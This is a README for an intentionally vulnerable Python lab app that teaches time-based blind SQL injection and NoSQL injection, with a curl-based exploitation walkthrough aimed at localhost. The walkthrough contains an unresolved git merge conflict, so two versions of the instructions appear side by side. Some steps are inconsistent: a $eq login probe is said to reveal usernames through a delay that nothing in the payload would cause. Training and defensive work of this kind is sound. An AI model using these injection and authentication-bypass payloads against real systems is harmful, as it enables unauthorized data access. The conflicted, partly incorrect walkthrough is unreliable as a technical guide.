# SQL and NoSQL Injection Labs

This repository contains a simple web application that demonstrates two common vulnerabilities:

- **Time-based blind SQL injection** using a vulnerable employee lookup page backed by SQLite.
- **NoSQL injection** via a login form that unsafely parses user supplied JSON.

The application is implemented in pure Python so it can run without extra dependencies.

## Usage

Start the server:

```bash
python3 app.py
```

Then open `http://localhost:8000` in your browser. You will see links to both labs.

These labs are intentionally vulnerable and should only be used in a controlled environment for educational purposes.

## Exploitation Walkthrough

<<<<<<< xgls4j-codex/create-time-based-sqli-and-no-sqli-labs
### SQL Injection (time‑based)
1. Open `http://localhost:8000/sql-lab` and look up ID `1`. The page only reports if a record exists.
2. Verify injection by causing a delay:
   ```bash
   curl -w '%{time_total}\n' "http://localhost:8000/sql-lab?id=1%20OR%20sleep(3)=0"
   ```
   The request takes roughly three seconds longer, proving that the injected `sleep(3)` function executed.
3. Test whether another employee ID exists using a conditional delay:
   ```bash
   curl -w '%{time_total}\n' "http://localhost:8000/sql-lab?id=1%20AND%20(SELECT%20CASE%20WHEN%20(SELECT%20count(*)%20FROM%20employees%20WHERE%20id=2)=1%20THEN%20sleep(3)%20ELSE%200%20END)"
   ```
   If ID 2 is present, the response is delayed.
4. Extract data character by character. For example, to check if the first letter of employee 1's name is `A`:
   ```bash
   curl -w '%{time_total}\n' "http://localhost:8000/sql-lab?id=1%20AND%20(SELECT%20CASE%20WHEN%20substr(name,1,1)='A'%20THEN%20sleep(3)%20ELSE%200%20END%20FROM%20employees%20WHERE%20id=1)"
   ```
   Repeat this test for each position to reveal the name using timing differences.
5. Continue enumerating additional rows and columns in the same way to recover the full dataset.

### NoSQL Injection
1. Go to `http://localhost:8000/nosql-lab` and attempt to log in normally.
2. Bypass authentication by supplying JSON values:
   ```bash
   curl -X POST -d "username=%7B%22%24ne%22:null%7D&password=%7B%22%24ne%22:null%7D" http://localhost:8000/nosql-lab
   ```
   Any user record with non‑null fields will match.
3. Check if a specific user exists by using the `$eq` operator:
   ```bash
   curl -X POST -d "username=%7B%22%24eq%22:%22alice%22%7D&password=%7B%22%24ne%22:null%7D" http://localhost:8000/nosql-lab
   ```
   A delay in response indicates a valid username when combined with the `$ne` password condition.
4. Combine these techniques to log in as any known user once the username is discovered.

These demonstrations highlight how unsanitized input leads to unauthorized database access. Always run the labs in an isolated environment.
=======
### Discovering the SQL Injection
1. Browse to `http://localhost:8000/sql-lab` and submit an ID such as `1`.
2. To confirm the injection vulnerability, supply a payload that causes a delay:
   ```bash
   curl -w '%{time_total}\n' "http://localhost:8000/sql-lab?id=1%20OR%20sleep(3)=0"
   ```
   The response time increases by about three seconds, proving the query executed `sleep(3)`.

### Extracting Data via SQL Injection
Use a boolean condition to dump all employee records:
```bash
curl "http://localhost:8000/sql-lab?id=1%20OR%201=1"
```
The server returns a list of all employees from the SQLite database.

### Discovering the NoSQL Injection
1. Visit `http://localhost:8000/nosql-lab` and attempt a normal login.
2. Instead of regular credentials, send a JSON-based operator in the username and password fields:
   ```bash
   curl -X POST -d "username=%7B%22%24ne%22:null%7D&password=%7B%22%24ne%22:null%7D" http://localhost:8000/nosql-lab
   ```
   The application interprets the JSON and matches any user where the username and password are not null, bypassing authentication.

These demonstrations highlight how unsanitized input leads to full database access. Always run the labs in an isolated environment.
>>>>>>> main
